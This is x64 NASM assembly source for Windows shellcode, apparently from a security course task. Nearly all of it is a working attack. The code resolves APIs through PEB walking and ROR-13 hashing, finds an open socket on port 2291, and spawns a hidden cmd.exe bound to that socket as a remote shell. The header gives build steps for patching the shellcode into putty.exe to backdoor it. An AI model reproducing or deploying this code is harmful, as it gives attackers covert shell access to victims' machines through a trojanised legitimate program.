;; dedkuzmich
;; .
;; Compile executable:
;; $ nasm -f win64 task2_exp.asm -o task2_exp.obj && gcc task2_exp.obj -o task2_exp.exe && ./task2_exp.exe
;; .
;; Compile shellcode:
;; $ nasm -f bin task2_sc.asm -o task2_sc.obj && python ../patcher.py --exe putty.exe --sc task2_sc.obj
;; .
;; Format:  https://github.com/dedkuzmich/nasmfmt_operands_indent
;; $ nasmfmt -oi 8 task2_exp.asm

        bits    64
        default rel                            ; RIP-relative addressing (without this, section .data will be ignored)

;        extern  puts
;        extern  strlen
;        extern  _ui64toa
;        extern  system
;        extern  strcmp
;
;        extern  GetStdHandle
;        extern  WriteFile
;        extern  ExitProcess
;        extern  GetLastError

        global  WinMain


;; Save and restore non-volatile (preserved) registers excluding rsp, rbp
        %macro  save_regs 0
        push    rbx
        push    rsi
        push    rdi
        push    r12
        push    r13
        push    r14
        push    r15
        %endmacro

        %macro  restore_regs 0
        pop     r15
        pop     r14
        pop     r13
        pop     r12
        pop     rdi
        pop     rsi
        pop     rbx
        %endmacro


;; Align %$localsize to 16 bytes and enter. Usage:      align_enter %$localsize
        %macro  align_enter 1
        %assign %%size %1
        %assign %%module %%size % 16
        %if     %%module != 0                  ; Make %%size a multiple of 16
        %assign %%diff 16 - %%module
        %assign %%size %%size + %%diff
        %endif 
        enter   (%%size + 8), 0                ; Add 8 to compensate "%push proc_context"
        %endmacro


;; Declare local variable of a custom size. Usage:      local_buf   buffer1, 32
        %macro  local_buf 2
        %assign %%size %2
        %assign %%module %%size % 8
        %if     %%module != 0                  ; Make %%size a multiple of 8
        %assign %%diff 8 - %%module
        %assign %%size %%size + %%diff
        %endif 
        %rep    (%%size - 8) / 8               ; Repeat for all QWORDs in %%size excepting 1 QWORD, that is the local var itself
        %local  hidden_var:qword               ; Declare pseudo var that won't be used anywhere just to "sub rsp, 8" and "%$localsize + 8"
        %endrep
        %local  %1:qword                       ; Declare local var
        %endmacro


        %define utf16(x) __?utf16?__(x)        ; UTF-16 macros



        section .data
        ; DEFAULT
STD_OUTPUT_HANDLE:
        dq      -11

szEndl:
        db      10, 0

szPause:
        db      "pause", 0


        ; KERNEL32.DLL
szKernel32:
        db      "kernel32.dll", 0

szLoadLibraryA:
        db      "LoadLibraryA", 0

szGetProcAddress:
        db      "GetProcAddress", 0

szSetConsoleCP:
        db      "SetConsoleCP", 0

szSetConsoleOutputCP:
        db      "SetConsoleOutputCP", 0

szCreateProcessA:
        db      "CreateProcessA", 0

szSleep:
        db      "Sleep", 0


        ; WS2_32.DLL
szWs2_32:
        db      "ws2_32.dll", 0

szGetsockname:
        db      "getsockname", 0

szNtohs:
        db      "ntohs", 0

szSend:
        db      "send", 0


        ; STRINGS
szIp:
        dw      "192.168.1.10", 0

szShell:
        db      "cmd.exe", 0

szTestMsg:
        db      "[+] Socket works", 10, 10, 0



        section .text
;; void WinMain()
WinMain:
        save_regs
        %push   proc_context
        %stacksize flat64
        %assign %$localsize 128                ; Shadow space (32) + space for stack args (96)

        ; KERNEL32.DLL
        %local  hKernel32:qword
        %local  pLoadLibraryA:qword
        %local  pGetProcAddress:qword
        %local  pSetConsoleCP:qword
        %local  pSetConsoleOutputCP:qword
        %local  pCreateProcessA:qword
        %local  pSleep:qword

        ; WS2_32.DLL
        %local  hWs2_32:qword
        %local  pGetsockname:qword
        %local  pNtohs:qword
        %local  pSend:qword

        ; STRUCTURES
        local_buf stAddrClient, 16
        local_buf stStartupInfo, 104
        local_buf stProcessInfo, 24
        
        ; OTHER VARS
        %local  iPort:qword
        %local  cbAddrClient:qword
        %local  iSockClient:qword
        align_enter %$localsize


        ; IMPORT
        ; LoadLibraryA
        lea     rcx, [szLoadLibraryA]
        call    GetKernel32ProcAddress
        mov     qword [pLoadLibraryA], rax
        ; GetProcAddress
        lea     rcx, [szGetProcAddress]
        call    GetKernel32ProcAddress
        mov     qword [pGetProcAddress], rax


        ; KERNEL32.DLL
        lea     rcx, [szKernel32]
        call    qword [pLoadLibraryA]
        mov     qword [hKernel32], rax
        ; SetConsoleCP
        mov     rcx, qword [hKernel32]
        lea     rdx, [szSetConsoleCP]
        call    qword [pGetProcAddress]
        mov     qword [pSetConsoleCP], rax
        ; SetConsoleOutputCP
        mov     rcx, qword [hKernel32]
        lea     rdx, [szSetConsoleOutputCP]
        call    qword [pGetProcAddress]
        mov     qword [pSetConsoleOutputCP], rax
        ; CreateProcessA
        mov     rcx, qword [hKernel32]
        lea     rdx, [szCreateProcessA]
        call    qword [pGetProcAddress]
        mov     qword [pCreateProcessA], rax
        ; Sleep
        mov     rcx, qword [hKernel32]
        lea     rdx, [szSleep]
        call    qword [pGetProcAddress]
        mov     qword [pSleep], rax


        ; WS2_32.DLL
        lea     rcx, [szWs2_32]
        call    qword [pLoadLibraryA]
        mov     qword [hWs2_32], rax
        ; getsockname
        mov     rcx, qword [hWs2_32]
        lea     rdx, [szGetsockname]
        call    qword [pGetProcAddress]
        mov     qword [pGetsockname], rax
        ; ntohs
        mov     rcx, qword [hWs2_32]
        lea     rdx, [szNtohs]
        call    qword [pGetProcAddress]
        mov     qword [pNtohs], rax
        ; send
        mov     rcx, qword [hWs2_32]
        lea     rdx, [szSend]
        call    qword [pGetProcAddress]
        mov     qword [pSend], rax


        ; CODE
        ; Initialize local vars
        lea     rcx, [stAddrClient]
        mov     rdx, 16
        mov     r8, 0
        call    InitStruct

        lea     rcx, [stStartupInfo]
        mov     rdx, 104
        mov     r8, 0
        call    InitStruct

        lea     rcx, [stProcessInfo]
        mov     rdx, 24
        mov     r8, 0
        call    InitStruct
        
        mov     qword [iPort], 2291
        mov     qword [cbAddrClient], 16
        mov     qword [iSockClient], 0
        

        ; Find client socket
        ; Iterate through sockets and find one with ip != INADDR_ANY and port == 2291
        mov     r15, 0
.nextSocket:
        mov     rcx, r15
        lea     rdx, [stAddrClient]
        lea     r8, [cbAddrClient]
        call    qword [pGetsockname]

        mov     qword [iSockClient], r15
        inc     r15
        lea     r12, [stAddrClient]

        mov     r13, 0
        mov     r13d, dword [r12 + 4]          ; stAddrClient.sin_addr = IP

        mov     rcx, 0
        mov     cx, word [r12 + 2]             ; stAddrClient.sin_port = PORT
        call    qword [pNtohs]
        mov     r14, rax

        ; Check IP
        cmp     r13, 0                         ; INADDR_ANY
        je      .nextSocket

        ; Check PORT
        cmp     r14, 2291                      ; PORT
        jne     .nextSocket
.endLoop:


        ; Initialize STARTUPINFOA structure
        mov     r14, qword [iSockClient]
        lea     r12, [stStartupInfo]
        mov     dword [r12 + 0], 104           ; stStartupInfo.cb = sizeof(STARTUPINFOA)
        mov     word [r12 + 64], 0             ; stStartupInfo.wShowWindow = SW_HIDE
        mov     dword [r12 + 60], 0x100        ; stStartupInfo.dwFlags = STARTF_USESTDHANDLES
        mov     qword [r12 + 80], r14          ; stStartupInfo.hStdInput = sock
        mov     qword [r12 + 88], r14          ; stStartupInfo.hStdOutput = sock
        mov     qword [r12 + 96], r14          ; stStartupInfo.hStdError = sock


        ; Set UTF-8 encoding
        mov     rcx, 65001                     ; CP_UTF8
        call    qword [pSetConsoleCP]

        mov     rcx, 65001                     ; CP_UTF8
        call    qword [pSetConsoleOutputCP]


        ; Spawn shell
        lea     r12, [stStartupInfo]
        lea     r13, [stProcessInfo]

        mov     rcx, 0
        lea     rdx, [szShell]
        mov     r8, 0
        mov     r9, 0
        mov     qword [rsp+32], 1              ; TRUE
        mov     qword [rsp+40], 0
        mov     qword [rsp+48], 0
        mov     qword [rsp+56], 0
        mov     qword [rsp+64], r12
        mov     qword [rsp+72], r13
        call    qword [pCreateProcessA]


        ; Close socket
        mov     rcx, 2000
        call    qword [pSleep]

        leave  
        restore_regs
        ret    
        %pop   



;; int GetKernel32ProcAddress (PSTR pProcName)
;; pProcName = rcx
GetKernel32ProcAddress:
        save_regs
        %push   proc_context
        %stacksize flat64
        %assign %$localsize 64
        %local  pProcName:qword
        %local  iProcName:qword
        %local  pKernel32:qword

        %local  iBase:qword
        %local  cNames:qword
        %local  pFunctions:qword
        %local  pNames:qword
        %local  pNameOrdinals:qword

        %local  pName:qword
        %local  idxName:qword
        %local  iOrdinal:qword
        %local  pFunction:qword
        align_enter %$localsize

        mov     qword [pProcName], rcx

        ; Hash function name
        mov     rcx, qword [pProcName]
        call    Ror13
        mov     qword [iProcName], rax


        ; Find kernel32.dll base address
        mov     rbx, [gs:0x60]                 ; PEB
        mov     rbx, [rbx + 0x18]              ; LDR
        mov     rbx, [rbx + 0x20]              ; InMemoryOrderModuleList (1st entry)
        mov     rbx, [rbx]                     ; 2 ntdll.dll
        mov     rbx, [rbx]                     ; 3 kernel32.dll
        mov     rbx, [rbx + 0x20]              ; InInitializationOrderLinks (1st entry)
        mov     qword [pKernel32], rbx         ; kernel32.dll base address


        ; Get info from kernel32.dll export directory
        mov     r12, qword [pKernel32]         ; kernel32.dll base (DOS header)
        mov     ebx, [r12 + 0x3c]              ; NT header offset
        add     rbx, r12                       ; NT header
        mov     ebx, [rbx + 0x18 + 0x70]       ; Export Directory RVA
        add     rbx, r12                       ; Export Directory

        mov     rcx, 0
        mov     ecx, [rbx + 0x10]              ; Base (ordinals of functions start from this number)
        mov     qword [iBase], rcx

        mov     ecx, [rbx + 0x18]              ; NumberOfNames
        mov     qword [cNames], rcx

        mov     ecx, [rbx + 0x1c]              ; AddressOfFunctions RVA
        add     rcx, r12                       ; AddressOfFunctions
        mov     qword [pFunctions], rcx

        mov     ecx, [rbx + 0x20]              ; AddressOfNames RVA
        add     rcx, r12                       ; AddressOfNames
        mov     qword [pNames], rcx

        mov     ecx, [rbx + 0x24]              ; AddressOfNameOrdinals RVA
        add     rcx, r12                       ; AddressOfNameOrdinals
        mov     qword [pNameOrdinals], rcx


        ; Find name index
        mov     r15, 0                         ; Counter
.nextName:
        mov     r12, qword [pNames]
        mov     ebx, [r12 + 4 * r15]           ; Name RVA
        add     rbx, qword [pKernel32]         ; Name
        mov     qword [pName], rbx
        mov     qword [idxName], r15

        mov     rcx, qword [pName]             ; Hash current name
        call    Ror13
        cmp     rax, qword [iProcName]         ; Compare ROR-13 hash with already known value
        je      .endLoop

        inc     r15
        cmp     r15, qword [cNames]            ; Max num of iterations = NumberOfNames
        jne     .nextName
.endLoop:
        ; Find ordinal
        mov     rax, 0
        mov     r12, qword [pNameOrdinals]
        mov     r15, qword [idxName]
        mov     ax, [r12 + 2 * r15]            ; Ordinal = Name index + Base
        add     rax, qword [iBase]             ; Base is a value of the 1st ordinal (it can be 1, 2, ... N)
        mov     qword [iOrdinal], rax


        ; Find address
        mov     rax, 0
        mov     r12, qword [pFunctions]
        mov     r15, qword [iOrdinal]
        sub     r15, qword [iBase]
        mov     eax, [r12 + 4 * r15]           ; Function RVA
        add     rax, qword [pKernel32]         ; Function
        mov     qword [pFunction], rax

        mov     rax, qword [pFunction]         ; Return function address

        leave  
        restore_regs
        ret    
        %pop   



;; void InitStruct(PSTR* pStruct, int cbStruct, int iValue)
;; pStruct = rcx
;; cbStruct = rdx
;; iValue = r8
InitStruct:
        save_regs
        %push   proc_context
        %stacksize flat64
        %assign %$localsize 64
        %local  pStruct:qword
        %local  cbStruct:qword
        %local  iValue:qword
        align_enter %$localsize

        mov     qword [pStruct], rcx
        mov     qword [cbStruct], rdx
        mov     qword [iValue], r8

        mov     r12, qword [pStruct]
        mov     r13, qword [cbStruct]
        mov     r14, qword [iValue]
        mov     r15, 0
.nextByte:
        mov     qword [r12 + r15], r14
        add     r15, 8
        cmp     r15, r13
        jne     .nextByte
.endLoop:
        leave  
        restore_regs
        ret    
        %pop   



;;; void PrintNum (int iNum, int Radix)
;;; iNum = rcx
;;; iRadix = rdx
;PrintNum:
;        save_regs
;        %push   proc_context
;        %stacksize flat64
;        %assign %$localsize 64
;        %local  iNum:qword
;        %local  iRadix:qword                   ; Base [2, 10, 16]
;        local_buf szNum, 24
;        align_enter %$localsize
;
;        mov     rsi, 0
;        mov     rdi, 0
;        mov     qword [iNum], rcx
;        mov     qword [iRadix], rdx
;
;        ; Convert int to string
;        mov     rcx, qword [iNum]
;        lea     rdx, [szNum]
;        mov     r8, qword [iRadix]
;        call    _ui64toa
;
;        ; Print string
;        lea     rcx, [szNum]
;        call    PrintStr
;        lea     rcx, [szEndl]
;        call    PrintStr
;
;        leave  
;        restore_regs
;        ret    
;        %pop   
;
;
;
;;; void PrintStr (PSTR pStr)
;;; pStr = rcx
;PrintStr:
;        save_regs
;        %push   proc_context
;        %stacksize flat64
;        %assign %$localsize 64                 ; Shadow space (32) + space for stack args (32)
;        %local  pStr:qword                     ; Pointer to string
;        %local  cbStr:qword                    ; Length of string
;        %local  cbWritten:qword
;        %local  hStdOut:qword
;        align_enter %$localsize
;
;        ; Set rsi, rdi to 0 for iterators correct work
;        mov     rsi, 0
;        mov     rdi, 0
;
;        ; Save argument(s) as local var(s)
;        mov     qword [pStr], rcx
;
;        ; Get length of string
;        mov     rcx, qword [pStr]
;        call    strlen
;        mov     qword [cbStr], rax
;
;        ; Get handle to StdOut
;        mov     rcx, [STD_OUTPUT_HANDLE]
;        call    GetStdHandle
;        mov     qword [hStdOut], rax
;
;        ; Write string to StdOut
;        mov     rcx, qword [hStdOut]
;        mov     rdx, qword [pStr]
;        mov     r8, qword [cbStr]
;        lea     r9, [cbWritten]
;        mov     qword [rsp+32], 0              ; 5th arg. 6th arg should be passed with [rsp+40]
;        call    WriteFile
;
;        leave  
;        restore_regs
;        ret    
;        %pop   
;

;; int Ror13 (PSTR pStr)
;; pStr = rcx
;; ROR-13 online:   https://asecuritysite.com/hash/ror13_2
Ror13:
        save_regs
        %push   proc_context
        %stacksize flat64
        %assign %$localsize 64
        %local  pStr:qword
        align_enter %$localsize

        mov     qword [pStr], rcx

        ; Hash loop
        mov     r11, qword [pStr]
        mov     r12, 0                         ; Hash
        mov     r15, 0                         ; Counter
.nextByte:
        mov     rbx, 0
        mov     bl, [r11 + 1 * r15]            ; Read a byte from string
        cmp     rbx, 0                         ; Check if current byte = 0
        je      .endLoop

        ror     r12d, 13                       ; Use r12 to have qword hash, r12d - dword hash
        add     r12, rbx
        inc     r15
        jmp     .nextByte
.endLoop:
        mov     rax, r12                       ; Return hash

        leave  
        restore_regs
        ret    
        %pop   
